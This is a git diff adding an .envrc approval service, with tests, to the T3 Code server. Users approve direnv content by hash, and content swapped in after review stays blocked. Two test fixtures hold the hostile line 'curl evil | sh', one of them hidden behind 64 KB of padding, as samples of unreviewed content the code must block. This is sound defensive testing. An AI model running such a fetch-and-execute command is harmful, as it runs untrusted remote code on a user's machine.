++          getThread: () => Effect.succeed({ projectId, worktreePath: WORKTREE } as never),
++        }),
++        ServerConfig.layerTest(process.cwd(), { prefix: "t3-project-environment-" }),
++      ),
++    ),
++    Layer.provideMerge(NodeServices.layer),
++  );
++  return { layer, allowed };
++}
++
++const service = ProjectEnvironmentService.ProjectEnvironmentService;
++const sha = (content: string) =>
++  Effect.gen(function* () {
++    const status = yield* (yield* service).status({ projectId, threadId });
++    expect(status.envrc?.content).toBe(content);
++    return status.envrc!.sha256;
++  });
++
++describe("ProjectEnvironmentService", () => {
++  it.effect("asks before loading a project's first .envrc, then allows its worktrees", () => {
++    const { layer, allowed } = setup({
++      [ROOT]: { content: "use flake\n", permission: "blocked" },
++      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
++    });
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      expect((yield* environment.status({ projectId })).pending).toBe("approve");
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(false);
++      expect(allowed).toEqual([]);
++
++      const sha256 = yield* sha("use flake\n");
++      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
++        approved: true,
++      });
++      expect(allowed).toEqual([WORKTREE]);
++      expect((yield* environment.status({ projectId })).pending).toBe("none");
++
++      // A new worktree with the approved content is allowed without asking.
++      expect(yield* environment.prepare(projectId, ROOT)).toBe(true);
++      expect(allowed).toEqual([WORKTREE, ROOT]);
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("asks again with a diff base when the .envrc changes", () => {
++    const checkouts = { [WORKTREE]: { content: "use flake\n", permission: "blocked" as const } };
++    const { layer, allowed } = setup(checkouts);
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      yield* environment.approve({ projectId, threadId, sha256: yield* sha("use flake\n") });
++      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };
++
++      expect(yield* environment.status({ projectId, threadId })).toMatchObject({
++        pending: "approve-change",
++        approvedContent: "use flake\n",
++      });
++      // Loads as blocked, so a running agent keeps its environment and the thread warns.
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
++      expect(allowed).toEqual([WORKTREE]);
++      expect(yield* environment.approve({ projectId, threadId, sha256: "stale" })).toMatchObject({
++        approved: false,
++      });
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("approves changes itself when the project trusts them", () => {
++    const checkouts = { [WORKTREE]: { content: "use flake\n", permission: "blocked" as const } };
++    const { layer, allowed } = setup(checkouts, { trustDirenvChanges: true });
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      // Trust only covers changes; the first .envrc still needs the user.
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(false);
++      yield* environment.approve({ projectId, threadId, sha256: yield* sha("use flake\n") });
++      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };
++
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
++      expect(allowed).toEqual([WORKTREE, WORKTREE]);
++      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("treats a root allowed from the user's shell as approval and remembers it", () => {
++    const checkouts: Record<string, Checkout> = {
++      [ROOT]: { content: "use flake\n", permission: "allowed" },
++      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
++    };
++    const { layer, allowed } = setup(checkouts);
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
++      expect(allowed).toEqual([WORKTREE]);
++
++      // The shell's approval is the diff base for the next change.
++      checkouts[WORKTREE] = { content: "use flake\nexport A=1\n", permission: "blocked" };
++      checkouts[ROOT] = { content: "use flake\nexport A=1\n", permission: "blocked" };
++      expect(yield* environment.status({ projectId, threadId })).toMatchObject({
++        pending: "approve-change",
++        approvedContent: "use flake\n",
++      });
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("never overrides a direnv deny without a new approval", () => {
++    const checkouts: Record<string, Checkout> = {
++      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
++    };
++    const { layer, allowed } = setup(checkouts);
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      const sha256 = yield* sha("use flake\n");
++      yield* environment.approve({ projectId, threadId, sha256 });
++      checkouts[WORKTREE]!.permission = "denied";
++
++      expect(yield* environment.prepare(projectId, WORKTREE)).toBe(true);
++      expect(allowed).toEqual([WORKTREE]);
++      expect((yield* environment.status({ projectId, threadId })).pending).toBe("approve-change");
++      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
++        approved: true,
++      });
++      expect(allowed).toEqual([WORKTREE, WORKTREE]);
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("allows only the reviewed content when the file is swapped and restored", () => {
++    const checkouts: Record<string, Checkout> = {
++      [WORKTREE]: { content: "use flake\n", permission: "blocked" },
++    };
++    const { layer } = setup(checkouts);
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      const sha256 = yield* sha("use flake\n");
++      expect(yield* environment.approve({ projectId, threadId, sha256 })).toEqual({
++        approved: true,
++      });
++      // Content the user never reviewed stays blocked at the same path.
++      checkouts[WORKTREE] = { content: "curl evil | sh\n", permission: "blocked" };
++      expect((yield* environment.status({ projectId, threadId })).pending).toBe("approve-change");
++      checkouts[WORKTREE] = { content: "use flake\n", permission: "blocked" };
++      expect((yield* environment.status({ projectId, threadId })).pending).toBe("none");
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("refuses to approve an .envrc too large to show", () => {
++    const content = `${"#".repeat(64 * 1024)}\ncurl evil | sh\n`;
++    const { layer, allowed } = setup({ [WORKTREE]: { content, permission: "blocked" } });
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      const status = yield* environment.status({ projectId, threadId });
++      expect(status.envrc).toMatchObject({ content: "", tooLarge: true });
++      const result = yield* environment.approve({
++        projectId,
++        threadId,
++        sha256: status.envrc!.sha256,
++      });
++      expect(result.approved).toBe(false);
++      expect(allowed).toEqual([]);
++    }).pipe(Effect.provide(layer));
++  });
++
++  it.effect("loads nothing and asks nothing when the setting is off", () => {
++    const { layer, allowed } = setup(
++      { [ROOT]: { content: "use flake\n", permission: "allowed" } },
++      { enableDirenvEnvironment: false },
++    );
++    return Effect.gen(function* () {
++      const environment = yield* service;
++      expect(yield* environment.status({ projectId })).toMatchObject({
++        pending: "none",
++        enabled: false,
++      });
++      expect(yield* environment.prepare(projectId, ROOT)).toBe(false);
++      expect(allowed).toEqual([]);
++    }).pipe(Effect.provide(layer));
++  });
++});
+diff --git a/apps/server/src/project/ProjectEnvironmentService.ts b/apps/server/src/project/ProjectEnvironmentService.ts
+new file mode 100644
+index 0000000000..34a5a20008
+--- /dev/null
++++ b/apps/server/src/project/ProjectEnvironmentService.ts
+@@ -0,0 +1,277 @@
++// @effect-diagnostics nodeBuiltinImport:off
++import * as NodeCrypto from "node:crypto";
++
++import type {
++  ProjectEnvironmentApproveInput,
++  ProjectEnvironmentApproveResult,
++  ProjectEnvironmentStatus,
++  ProjectEnvironmentStatusInput,
++  ProjectId,
++} from "@t3tools/contracts";
++import { writeFileStringAtomically } from "@t3tools/shared/atomicWrite";
++import { resolveProjectSettings } from "@t3tools/shared/projectSettings";
++import * as Context from "effect/Context";
++import * as DateTime from "effect/DateTime";
++import * as Effect from "effect/Effect";
++import * as FileSystem from "effect/FileSystem";
++import * as Layer from "effect/Layer";
++import * as Option from "effect/Option";
++import * as Path from "effect/Path";
++import * as Schema from "effect/Schema";
++import * as Semaphore from "effect/Semaphore";
++
++import * as ServerConfig from "../config.ts";
++import * as ProjectionStore from "../orchestration-v2/ProjectionStore.ts";
++import * as DirenvEnvironment from "../provider/DirenvEnvironment.ts";
++import * as ServerSettings from "../serverSettings.ts";
++import * as ProjectService from "./ProjectService.ts";
++
++/**
++ * The user approves an `.envrc` content once per project; T3 Code then runs `direnv allow`
++ * itself in every checkout with that content, worktrees included. direnv stays the source of
++ * truth for what loads, so shells with the direnv hook see the same trust.
++ */
++export class ProjectEnvironmentService extends Context.Service<
++  ProjectEnvironmentService,
++  {
++    readonly status: (
++      input: ProjectEnvironmentStatusInput,
++    ) => Effect.Effect<ProjectEnvironmentStatus>;
++    readonly approve: (
++      input: ProjectEnvironmentApproveInput,
++    ) => Effect.Effect<ProjectEnvironmentApproveResult>;
++    /**
++     * Allow `cwd`'s approved `.envrc` before a provider or setup script starts there. False
++     * when nothing may load. A changed `.envrc` stays blocked and loads as a failure, so a
++     * running agent keeps its environment and the thread offers a review.
++     */
++    readonly prepare: (projectId: ProjectId, cwd: string) => Effect.Effect<boolean>;
++    /** The project's Load direnv environment setting. */
++    readonly enabled: (projectId: ProjectId) => Effect.Effect<boolean>;
++  }
++>()("t3/project/ProjectEnvironmentService") {}
++
++const APPROVALS_FILE = "direnv-approvals.json";
++// Older approvals only matter as the base of a change diff.
++const MAX_APPROVALS_PER_PROJECT = 5;
++const MAX_ENVRC_LENGTH = 64 * 1024;
++
++const Approval = Schema.Struct({
++  sha256: Schema.String,
++  content: Schema.String,
++  approvedAt: Schema.String,
++});
++type Approval = typeof Approval.Type;
++
++const ApprovalsJson = Schema.fromJsonString(Schema.Record(Schema.String, Schema.Array(Approval)));
++const decodeApprovals = Schema.decodeUnknownOption(ApprovalsJson);
++const encodeApprovals = Schema.encodeSync(ApprovalsJson);
++
++type Approvals = Readonly<Record<string, ReadonlyArray<Approval>>>;
++
++const sha256 = (content: string) => NodeCrypto.createHash("sha256").update(content).digest("hex");
++
++interface Evaluation {
++  readonly envrc: DirenvEnvironment.DirenvEnvrc | null;
++  readonly sha256: string | null;
++  readonly approvals: ReadonlyArray<Approval>;
++  /** Approved in T3 Code, in the user's shell, or by the trust-changes setting. */
++  readonly approved: boolean;
++  /** Approved but not recorded yet, so T3 Code has no diff base for its next change. */
++  readonly unrecorded: boolean;
++}
++
++const make = Effect.fn("ProjectEnvironmentService.make")(function* () {
++  const direnv = yield* DirenvEnvironment.DirenvEnvironment;
++  const serverSettings = yield* ServerSettings.ServerSettingsService;
++  const projects = yield* ProjectService.ProjectService;
++  const projectionStore = yield* ProjectionStore.ProjectionStoreV2;
++  const fileSystem = yield* FileSystem.FileSystem;
++  const path = yield* Path.Path;
++  const { stateDir } = yield* ServerConfig.ServerConfig;
++  const approvalsPath = path.join(stateDir, APPROVALS_FILE);
++  const writeLock = yield* Semaphore.make(1);
++  const writeFile = (contents: string) =>
++    writeFileStringAtomically({ filePath: approvalsPath, contents }).pipe(
++      Effect.provideService(FileSystem.FileSystem, fileSystem),
++      Effect.provideService(Path.Path, path),
++    );
++
++  const readApprovals = fileSystem.readFileString(approvalsPath).pipe(
++    Effect.map((raw) => Option.getOrElse(decodeApprovals(raw), (): Approvals => ({}))),
++    Effect.orElseSucceed((): Approvals => ({})),
++  );
++
++  const recordApproval = Effect.fn("ProjectEnvironmentService.recordApproval")(function* (
++    projectId: ProjectId,
++    content: string,
++  ) {
++    const now = DateTime.formatIso(yield* DateTime.now);
++    yield* writeLock.withPermits(1)(
++      Effect.gen(function* () {
++        const current = yield* readApprovals;
++        const hash = sha256(content);
++        const previous = (current[projectId] ?? []).filter((entry) => entry.sha256 !== hash);
++        const next: Approvals = {
++          ...current,
++          [projectId]: [...previous, { sha256: hash, content, approvedAt: now }].slice(
++            -MAX_APPROVALS_PER_PROJECT,
++          ),
++        };
++        yield* writeFile(encodeApprovals(next));
++      }),
++    );
++  });
++
++  const projectRoot = (projectId: ProjectId) =>
++    projects.getById(projectId).pipe(
++      Effect.map((project) => Option.getOrUndefined(project)?.workspaceRoot),
++      Effect.orElseSucceed(() => undefined),
++    );
++
++  const settingsFor = (projectId: ProjectId) =>
++    serverSettings.getSettings.pipe(
++      Effect.orDie,
++      Effect.map((settings) => resolveProjectSettings(settings, projectId).settings),
++    );
++
++  const evaluate = Effect.fn("ProjectEnvironmentService.evaluate")(function* (
++    projectId: ProjectId,
++    cwd: string,
++  ) {
++    const envrc = Option.getOrNull(yield* direnv.inspect(cwd));
++    const approvals = (yield* readApprovals)[projectId] ?? [];
++    if (envrc === null) {
++      return { envrc, sha256: null, approvals, approved: false, unrecorded: false };
++    }
++    const hash = sha256(envrc.content);
++    const recorded = approvals.some((entry) => entry.sha256 === hash);
++    // An explicit `direnv deny` wins until the user approves again.
++    if (envrc.permission === "denied") {
++      return { envrc, sha256: hash, approvals, approved: false, unrecorded: false };
++    }
++    let approved = envrc.permission === "allowed" || recorded;
++    if (!approved) {
++      // A project allowed from the user's shell vouches for worktrees with the same content.
++      const root = yield* projectRoot(projectId);
++      if (root !== undefined && path.resolve(root) !== path.resolve(cwd)) {
++        const rootEnvrc = Option.getOrNull(yield* direnv.inspect(root));
++        approved =
++          rootEnvrc !== null &&
++          rootEnvrc.permission === "allowed" &&
++          sha256(rootEnvrc.content) === hash;
++      }
++    }
++    if (!approved && approvals.length > 0) {
++      approved = (yield* settingsFor(projectId)).trustDirenvChanges;
++    }
++    return {
++      envrc,
++      sha256: hash,
++      approvals,
++      approved,
++      unrecorded: approved && !recorded && envrc.content.length <= MAX_ENVRC_LENGTH,
++    } satisfies Evaluation;
++  });
++
++  const recordQuietly = (projectId: ProjectId, content: string) =>
++    recordApproval(projectId, content).pipe(
++      Effect.catchCause((cause) =>
++        Effect.logWarning("Could not save the .envrc approval.", { cause }),
++      ),
++    );
++
++  /** The project and directory a request targets; a thread decides both when given. */
++  const resolveTarget = Effect.fn("ProjectEnvironmentService.resolveTarget")(function* (
++    input: ProjectEnvironmentStatusInput,
++  ) {
++    if (input.threadId !== undefined) {
++      const thread = yield* projectionStore
++        .getThread(input.threadId)
++        .pipe(Effect.orElseSucceed(() => null));
++      if (thread === null) return undefined;
++      const cwd = thread.worktreePath ?? (yield* projectRoot(thread.projectId));
++      return cwd === undefined ? undefined : { projectId: thread.projectId, cwd };
++    }
++    const cwd = yield* projectRoot(input.projectId);
++    return cwd === undefined ? undefined : { projectId: input.projectId, cwd };
++  });
++
++  const status: ProjectEnvironmentService["Service"]["status"] = Effect.fn(
++    "ProjectEnvironmentService.status",
++  )(function* (input) {
++    const target = yield* resolveTarget(input);
++    if (target === undefined) {
++      return { envrc: null, pending: "none", approvedContent: null, enabled: false } as const;
++    }
++    const enabled = (yield* settingsFor(target.projectId)).enableDirenvEnvironment;
++    const {
++      envrc,
++      sha256: hash,
++      approvals,
++      approved,
++    } = yield* evaluate(target.projectId, target.cwd);
++    if (envrc === null || hash === null) {
++      return { envrc: null, pending: "none", approvedContent: null, enabled: false } as const;
++    }
++    const tooLarge = envrc.content.length > MAX_ENVRC_LENGTH;
++    const latest = approvals.at(-1);
++    return {
++      envrc: { path: envrc.path, content: tooLarge ? "" : envrc.content, sha256: hash, tooLarge },
++      pending: !enabled || approved ? "none" : latest === undefined ? "approve" : "approve-change",
++      approvedContent: latest?.content ?? null,
++      enabled,
++    } satisfies ProjectEnvironmentStatus;
++  });
++
++  const approve: ProjectEnvironmentService["Service"]["approve"] = Effect.fn(
++    "ProjectEnvironmentService.approve",
++  )(function* (input) {
++    const target = yield* resolveTarget(input);
++    if (target === undefined) return { approved: false, error: "The project no longer exists." };
++    const envrc = Option.getOrNull(yield* direnv.inspect(target.cwd));
++    if (envrc === null) return { approved: false, error: "No .envrc governs this workspace." };
++    if (envrc.content.length > MAX_ENVRC_LENGTH) {
++      return {
++        approved: false,
++        error: "This .envrc is too large to review here. Run direnv allow.",
++      };
++    }
++    if (sha256(envrc.content) !== input.sha256) {
++      return { approved: false, error: "The .envrc changed while you were reviewing it." };
++    }
++    const allowed = yield* direnv.allow(envrc.path, envrc.content);
++    if (allowed._tag === "Failed") return { approved: false, error: allowed.message };
++    yield* recordQuietly(target.projectId, envrc.content);
++    return { approved: true };
++  });
++
++  const prepare: ProjectEnvironmentService["Service"]["prepare"] = Effect.fn(
++    "ProjectEnvironmentService.prepare",
++  )(function* (projectId, cwd) {
++    if (!(yield* settingsFor(projectId)).enableDirenvEnvironment) return false;
++    const evaluation = yield* evaluate(projectId, cwd);
++    const { envrc, sha256: hash } = evaluation;
++    // Without an `.envrc`, loading only unloads what a previous one set.
++    if (envrc === null || hash === null) return true;
++    if (!evaluation.approved) return evaluation.approvals.length > 0;
++    if (envrc.permission !== "allowed") {
++      const allowed = yield* direnv.allow(envrc.path, envrc.content);
++      if (allowed._tag === "Failed") {
++        yield* Effect.logWarning("Could not allow an approved .envrc.", {
++          cwd,
++          message: allowed.message,
++        });
++      }
++    }
++    if (evaluation.unrecorded) yield* recordQuietly(projectId, envrc.content);
++    return true;
++  });
++
++  const enabled: ProjectEnvironmentService["Service"]["enabled"] = (projectId) =>
++    settingsFor(projectId).pipe(Effect.map((settings) => settings.enableDirenvEnvironment));
++
++  return ProjectEnvironmentService.of({ status, approve, prepare, enabled });
++});
++
++export const layer = Layer.effect(ProjectEnvironmentService, make());
+diff --git a/apps/server/src/provider/DirenvEnvironment.test.ts b/apps/server/src/provider/DirenvEnvironment.test.ts
+index d24363d4c1..652adb2ad6 100644
+--- a/apps/server/src/provider/DirenvEnvironment.test.ts
++++ b/apps/server/src/provider/DirenvEnvironment.test.ts
+@@ -1,3 +1,6 @@
++// @effect-diagnostics nodeBuiltinImport:off
++import * as NodeCrypto from "node:crypto";
++
+ import * as NodeServices from "@effect/platform-node/NodeServices";
+ import { afterEach, describe, expect, it } from "@effect/vitest";
+ import * as HostProcess from "@t3tools/shared/HostProcess";
+@@ -6,6 +9,7 @@ import * as Effect from "effect/Effect";
+ import * as Fiber from "effect/Fiber";
+ import * as FileSystem from "effect/FileSystem";
+ import * as Layer from "effect/Layer";
++import * as Option from "effect/Option";
+ import * as Path from "effect/Path";
+ import * as ChildProcessSpawner from "effect/process/ChildProcessSpawner";
+ import { vi } from "vite-plus/test";
+@@ -66,13 +70,19 @@ describe("DirenvEnvironment.load", () => {
+ 
+   it.effect("loads the exported variables from the nearest parent .envrc", () =>
+     Effect.gen(function* () {
++      const fileSystem = yield* FileSystem.FileSystem;
++      const path = yield* Path.Path;
+       const { nested } = yield* makeProject;
++      // Reached through a symlink, as direnv does: the parent is the physical one.
++      const elsewhere = yield* fileSystem.makeTempDirectoryScoped({ prefix: "t3-direnv-link-" });
++      const linked = path.join(elsewhere, "app");
++      yield* fileSystem.symlink(nested, linked);
+       runMock.mockReturnValueOnce(
+         Effect.succeed(output({ stdout: '{"PATH":"/nix/store/x/bin:/usr/bin","OLD":null}' })),
+       );
+       const direnv = yield* DirenvEnvironment.DirenvEnvironment;
+ 
+-      const result = yield* direnv.load(nested);
++      const result = yield* direnv.load(linked);
+ 
+       expect(result).toEqual({
+         _tag: "Loaded",
+@@ -80,7 +90,7 @@ describe("DirenvEnvironment.load", () => {
+         changed: true,
+       });
+       expect(runMock).toHaveBeenCalledWith(
+-        expect.objectContaining({ command: "direnv", args: ["export", "json"], cwd: nested }),
++        expect.objectContaining({ command: "direnv", args: ["export", "json"], cwd: linked }),
+       );
+     }).pipe(Effect.scoped, Effect.provide(TestLayer)),
+   );
+@@ -195,16 +205,65 @@ describe("DirenvEnvironment.load", () => {
+ });
+ 
+ describe("DirenvEnvironment.allow", () => {
+-  it.effect("allows the .envrc governing the directory", () =>
++  it.effect("writes direnv's record for the given content and clears a deny", () =>
+     Effect.gen(function* () {
++      const fileSystem = yield* FileSystem.FileSystem;
++      const path = yield* Path.Path;
++      const { envrcPath } = yield* makeProject;
++      const dataDir = yield* fileSystem.makeTempDirectoryScoped({ prefix: "t3-direnv-data-" });
++      const digest = (data: string) => NodeCrypto.createHash("sha256").update(data).digest("hex");
++      const denyPath = path.join(dataDir, "deny", digest(`${envrcPath}\n`));
++      yield* fileSystem.makeDirectory(path.dirname(denyPath), { recursive: true });
++      yield* fileSystem.writeFileString(denyPath, `${envrcPath}\n`);
++      runMock.mockReturnValueOnce(
++        Effect.succeed(
++          output({
++            stdout: `Found RC path ${envrcPath}\nFound RC allowed 1\nFound RC allowPath ${path.join(dataDir, "allow", "current")}\n`,
++          }),
++        ),
++      );
++      const direnv = yield* DirenvEnvironment.DirenvEnvironment;
++
++      // The reviewed content, even though the file on disk now holds something else.
++      expect(yield* direnv.allow(envrcPath, "use nix\n")).toEqual({ _tag: "Allowed" });
++      expect(
++        yield* fileSystem.readFileString(
++          path.join(dataDir, "allow", digest(`${envrcPath}\nuse nix\n`)),
++        ),
++      ).toBe(`${envrcPath}\n`);
++      expect(yield* fileSystem.exists(denyPath)).toBe(false);
++    }).pipe(Effect.scoped, Effect.provide(TestLayer)),
++  );
++});
++
++describe("DirenvEnvironment.inspect", () => {
++  it.effect("trusts direnv's permission only for the content it judged", () =>
++    Effect.gen(function* () {
++      const fileSystem = yield* FileSystem.FileSystem;
+       const { envrcPath, nested } = yield* makeProject;
+-      runMock.mockReturnValueOnce(Effect.succeed(output({})));
++      const digest = (data: string) => NodeCrypto.createHash("sha256").update(data).digest("hex");
++      const status = (allowed: number, content: string) =>
++        Effect.succeed(
++          output({
++            stdout: `Found RC path ${envrcPath}\nFound RC allowed ${allowed}\nFound RC allowPath /data/allow/${digest(`${envrcPath}\n${content}`)}\n`,
++          }),
++        );
++      runMock
++        .mockReturnValueOnce(status(0, "use flake\n"))
++        .mockReturnValueOnce(status(2, "use flake\n"))
++        // direnv saw approved content, but the file changed before T3 Code read it.
++        .mockReturnValueOnce(status(0, "approved\n"));
+       const direnv = yield* DirenvEnvironment.DirenvEnvironment;
++      const inspect = direnv.inspect(nested).pipe(Effect.map(Option.getOrNull));
+ 
+-      expect(yield* direnv.allow(nested)).toEqual({ _tag: "Allowed", envrcPath });
+-      expect(runMock).toHaveBeenCalledWith(
+-        expect.objectContaining({ command: "direnv", args: ["allow", envrcPath] }),
+-      );
++      expect(yield* inspect).toEqual({
++        path: envrcPath,
++        content: "use flake\n",
++        permission: "allowed",
++      });
++      expect((yield* inspect)?.permission).toBe("denied");
++      expect((yield* inspect)?.permission).toBe("blocked");
++      expect(yield* fileSystem.readFileString(envrcPath)).toBe("use flake\n");
+     }).pipe(Effect.scoped, Effect.provide(TestLayer)),
+   );
+ });
+diff --git a/apps/server/src/provider/DirenvEnvironment.ts b/apps/server/src/provider/DirenvEnvironment.ts
+index 7cb6798076..88ecd75fb5 100644
+--- a/apps/server/src/provider/DirenvEnvironment.ts
++++ b/apps/server/src/provider/DirenvEnvironment.ts
+@@ -1,4 +1,6 @@
+-import type { ThreadId } from "@t3tools/contracts";
++// @effect-diagnostics nodeBuiltinImport:off
++import * as NodeCrypto from "node:crypto";
++
+ import * as HostProcess from "@t3tools/shared/HostProcess";
+ import * as Context from "effect/Context";
+ import * as Deferred from "effect/Deferred";
+@@ -45,9 +47,21 @@ export type DirenvLoadResult =
+ 
+ export type DirenvLoadFailure = Extract<DirenvLoadResult, { readonly _tag: "Failed" }>;
+ 
++export interface DirenvEnvrc {
++  readonly path: string;
++  readonly content: string;
++  /** direnv's own record for this content at this path; `denied` came from `direnv deny`. */
++  readonly permission: "allowed" | "blocked" | "denied";
++}
++
++interface DirenvStatus {
++  readonly rcPath: string;
++  readonly allowed: number;
++  readonly allowPath: string;
++}
++
+ export type DirenvAllowResult =
+-  | { readonly _tag: "Allowed"; readonly envrcPath: string }
+-  | { readonly _tag: "NotFound" }
++  | { readonly _tag: "Allowed" }
+   | { readonly _tag: "Failed"; readonly message: string };
+ 
+ /**
+@@ -69,18 +83,24 @@ export class DirenvEnvironment extends Context.Service<
+       cwd: string,
+       previous?: DirenvEnvironmentDiff,
+     ) => Effect.Effect<DirenvLoadResult>;
+-    /** `direnv allow` the `.envrc` governing `cwd`. */
+-    readonly allow: (cwd: string) => Effect.Effect<DirenvAllowResult>;
++    /**
++     * Allow `content` at `envrcPath`, as `direnv allow` would for that file. Writing direnv's
++     * record for the given bytes, rather than running `direnv allow` on whatever the path
++     * holds by then, means a file replaced after review stays blocked.
++     */
++    readonly allow: (envrcPath: string, content: string) => Effect.Effect<DirenvAllowResult>;
++    /** The `.envrc` governing `cwd`; none without one, on Windows, or without direnv. */
++    readonly inspect: (cwd: string) => Effect.Effect<Option.Option<DirenvEnvrc>>;
+   }
+ >()("t3/provider/DirenvEnvironment") {}
+ 
+ const DIRENV_FAILURE_MESSAGES: Record<DirenvFailureReason, string> = {
+-  blocked: "The project's .envrc is blocked, so its direnv environment was not loaded.",
++  blocked: "The project's .envrc needs your approval, so its direnv environment was not loaded.",
+   timeout: "Loading the project's direnv environment timed out.",
+   failed: "The project's direnv environment failed to load.",
+ };
+ 
+-/** What a thread shows for a failed load; a blocked `.envrc` offers to allow it. */
++/** What a thread shows for a failed load; a blocked `.envrc` offers to review it. */
+ export function direnvFailureNotice(failure: DirenvLoadFailure): {
+   readonly message: string;
+   readonly detail: string;
+@@ -123,7 +143,10 @@ const make = Effect.fn("DirenvEnvironment.make")(function* () {
+   const platform = yield* HostProcess.Platform;
+ 
+   const findEnvrc = Effect.fn("DirenvEnvironment.findEnvrc")(function* (cwd: string) {
+-    let directory = path.resolve(cwd);
++    // direnv walks the physical directory's ancestors, not the symlinked ones.
++    let directory = yield* fileSystem
++      .realPath(cwd)
++      .pipe(Effect.orElseSucceed(() => path.resolve(cwd)));
+     while (true) {
+       const candidate = path.join(directory, ".envrc");
+       if (yield* fileSystem.exists(candidate).pipe(Effect.orElseSucceed(() => false))) {
+@@ -208,21 +231,78 @@ const make = Effect.fn("DirenvEnvironment.make")(function* () {
+       );
+     });
+ 
+-  const allow = Effect.fn("DirenvEnvironment.allow")(function* (cwd: string) {
+-    const envrcPath = yield* findEnvrc(cwd);
+-    if (Option.isNone(envrcPath)) return { _tag: "NotFound" } as const;
++  // Mirrors direnv's rc.go: sha256 of the path, a newline and the content names the allow
++  // record, which holds the path; the deny record is named by the path alone.
++  const digest = (data: string) => NodeCrypto.createHash("sha256").update(data).digest("hex");
++
++  /** direnv's own view of the `.envrc` governing `cwd`: its physical path and records. */
++  const readStatus = Effect.fn("DirenvEnvironment.readStatus")(function* (cwd: string) {
+     const result = yield* runner
+-      .run({ command: "direnv", args: ["allow", envrcPath.value], cwd })
++      .run({ command: "direnv", args: ["status"], cwd })
+       .pipe(Effect.result);
+-    if (result._tag === "Failure") {
+-      return { _tag: "Failed", message: result.failure.message } as const;
++    if (result._tag === "Failure") return Option.none<DirenvStatus>();
++    const field = (name: string) =>
++      new RegExp(`^Found RC ${name} (.+)$`, "m").exec(result.success.stdout)?.[1]?.trim();
++    const rcPath = field("path");
++    const allowPath = field("allowPath");
++    if (rcPath === undefined || allowPath === undefined) return Option.none<DirenvStatus>();
++    return Option.some({ rcPath, allowed: Number(field("allowed")), allowPath });
++  });
++
++  const allow = Effect.fn("DirenvEnvironment.allow")(function* (
++    envrcPath: string,
++    content: string,
++  ) {
++    const failed = (message: string) => ({ _tag: "Failed", message }) as const;
++    const status = yield* readStatus(path.dirname(envrcPath));
++    if (Option.isNone(status) || status.value.rcPath !== envrcPath) {
++      return failed("direnv did not report the .envrc that was reviewed.");
+     }
+-    return result.success.code === 0
+-      ? ({ _tag: "Allowed", envrcPath: envrcPath.value } as const)
+-      : ({ _tag: "Failed", message: direnvErrorMessage(result.success.stderr) } as const);
++    const allowDir = path.dirname(status.value.allowPath);
++    const written = yield* fileSystem
++      .makeDirectory(allowDir, { recursive: true })
++      .pipe(
++        Effect.andThen(
++          fileSystem.writeFileString(
++            path.join(allowDir, digest(`${envrcPath}\n${content}`)),
++            `${envrcPath}\n`,
++          ),
++        ),
++        Effect.andThen(
++          fileSystem
++            .remove(path.join(path.dirname(allowDir), "deny", digest(`${envrcPath}\n`)))
++            .pipe(Effect.catchTags({ PlatformError: () => Effect.void })),
++        ),
++        Effect.result,
++      );
++    return written._tag === "Failure"
++      ? failed(written.failure.message)
++      : ({ _tag: "Allowed" } as const);
++  });
++
++  const inspect = Effect.fn("DirenvEnvironment.inspect")(function* (cwd: string) {
++    if (platform === "win32") return Option.none<DirenvEnvrc>();
++    // Cheap check first, so projects without an `.envrc` never spawn direnv.
++    if (Option.isNone(yield* findEnvrc(cwd))) return Option.none<DirenvEnvrc>();
++    // Having an `.envrc` without direnv installed is common in shared repos.
++    const status = yield* readStatus(cwd);
++    if (Option.isNone(status)) return Option.none<DirenvEnvrc>();
++    const { rcPath, allowed, allowPath } = status.value;
++    const content = yield* fileSystem
++      .readFileString(rcPath)
++      .pipe(Effect.orElseSucceed(() => undefined));
++    if (content === undefined) return Option.none<DirenvEnvrc>();
++    // direnv judged the file as it was when it ran; only trust that for the same bytes.
++    const sameContent = path.basename(allowPath) === digest(`${rcPath}\n${content}`);
++    return Option.some<DirenvEnvrc>({
++      path: rcPath,
++      content,
++      // direnv reports 0 for allowed, 1 for not allowed and 2 for denied.
++      permission: allowed === 2 ? "denied" : allowed === 0 && sameContent ? "allowed" : "blocked",
++    });
+   });
+ 
+-  return DirenvEnvironment.of({ load, allow });
++  return DirenvEnvironment.of({ load, allow, inspect });
+ });
+ 
+ export const layer = Layer.effect(DirenvEnvironment, make());
+diff --git a/apps/server/src/server.ts b/apps/server/src/server.ts
+index 9c983aee32..4a089136bb 100644
+--- a/apps/server/src/server.ts
++++ b/apps/server/src/server.ts
+@@ -86,6 +86,7 @@ import * as ServerBrowserStream from "./preview/ServerBrowserStream.ts";
+ import * as PreviewBrowser from "./preview/PreviewBrowser.ts";
+ import * as ProcessRunner from "./processRunner.ts";
+ import * as DirenvEnvironment from "./provider/DirenvEnvironment.ts";
++import * as ProjectEnvironmentService from "./project/ProjectEnvironmentService.ts";
+ import * as GitManager from "./git/GitManager.ts";
+ import * as EnvironmentTheme from "./environmentTheme.ts";
